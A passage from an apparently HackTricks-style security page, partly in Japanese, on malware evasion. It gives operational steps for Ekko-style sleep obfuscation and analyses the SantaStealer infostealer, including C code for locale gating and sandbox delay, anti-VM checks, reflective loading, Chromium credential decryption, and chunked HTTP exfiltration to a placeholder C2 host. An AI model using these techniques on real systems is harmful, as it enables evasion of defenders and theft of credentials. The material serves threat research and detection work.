- The compiler emits an IAT entry, enabling interception when the reflective loader resolves imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Instead of patching `Sleep`, hook the **actual wait/IPC primitives** the implant uses (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). For long waits, wrap the call in an Ekko-style obfuscation chain that encrypts the in-memory image during idle:

- Use `CreateTimerQueueTimer` to schedule a sequence of callbacks that call `NtContinue` with crafted `CONTEXT` frames.
- Typical chain (x64): set image to `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` over the full mapped image → perform the blocking wait → RC4 decrypt → **restore per-section permissions** by walking PE sections → signal completion.
- `RtlCaptureContext` provides a template `CONTEXT`; clone it into multiple frames and set registers (`Rip/Rcx/Rdx/R8/R9`) to invoke each step.

Operational detail: return “success” for long waits (e.g., `WAIT_OBJECT_0`) so the caller continues while the image is masked. This pattern hides the module from scanners during idle windows and avoids the classic “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Bursts of `CreateTimerQueueTimer` callbacks pointing to `NtContinue`.
- `advapi32!SystemFunction032` used on large contiguous image-sized buffers.
- Large-range `VirtualProtect` followed by custom per-section permission restoration.


## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential access in a single workflow.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 多層化された `check_antivm` ロジック

- Variant A はプロセス一覧を巡回し、各名前をカスタムのローリングチェックサムでハッシュしてデバッガー/サンドボックス用の埋め込みブロックリストと照合する；同じチェックサムをコンピュータ名にも適用し、`C:\analysis` のような作業ディレクトリを確認する。
- Variant B はシステムプロパティ（プロセス数の下限、最近の稼働時間）を検査し、`OpenServiceA("VBoxGuest")` を呼んで VirtualBox の追加コンポーネントを検出し、sleep 周辺のタイミングチェックで single-stepping を見つける。何かヒットした場合はモジュール起動前に中止する。

### Fileless helper + 二重 ChaCha20 reflective loading

- プライマリの DLL/EXE は Chromium credential helper を埋め込んでおり、それはディスクにドロップされるかメモリに手動マッピングされる；fileless mode ではインポート/リロケーションを自力で解決するためヘルパーのアーティファクトは書き込まれない。
- そのヘルパーは second-stage DLL を ChaCha20 で二重（32 バイトのキー×2 + 12 バイトのノンス）で暗号化して保持する。両パス完了後に blob を reflectively load（`LoadLibrary` は使わない）し、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来するエクスポート `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` を呼び出す。
- ChromElevator のルーチンは direct-syscall reflective process hollowing を用いて稼働中の Chromium ブラウザに注入し、AppBound Encryption キーを継承して、ABE hardening があっても SQLite データベースからパスワード／クッキー／クレジットカードを直接復号する。

### モジュラーな in-memory 収集 & chunked HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` 関数ポインタテーブルを反復し、有効なモジュールごとにスレッドを生成する（Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.）。各スレッドは結果を共有バッファに書き込み、約45秒の join ウィンドウ後にファイル数を報告する。
- 完了後、すべてを静的リンクされた `miniz` ライブラリで圧縮して `%TEMP%\\Log.zip` とする。`ThreadPayload1` は 15s スリープした後、アーカイブを 10 MB チャンクで HTTP POST により `http://<C2>:6767/upload` にストリーミングし、ブラウザの `multipart/form-data` バウンダリ（`----WebKitFormBoundary***`）を偽装する。各チャンクには `User-Agent: upload`、`auth: <build_id>`、省略可能な `w: <campaign_tag>` を付与し、最終チャンクは `complete: true` を付けて C2 が再結合の完了を認識できるようにする。

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
